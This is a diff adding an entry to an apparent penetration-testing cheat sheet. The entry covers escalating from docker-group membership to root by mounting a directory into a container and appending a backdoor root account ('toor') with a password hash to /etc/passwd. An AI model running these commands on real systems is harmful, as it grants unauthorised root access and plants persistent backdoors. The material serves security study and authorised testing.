@@ -82,6 +82,18 @@ Install Docker:
 ```bash
 # docker run -d -p 80:80 citizenstig/dvwa
 ```
+## Privilege Escalation
+### User part of docker group
+You land on a computer and `id` shows you're part of the `docker` group. Escalate to root with:
+
+```bash
+$> docker run -it --rm -v $PWD:/mnt bash
+```
+
+adds backdoor toor:password
+```bash
+#> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+```
 
 ## Reverse shell techniques
 ### Bash
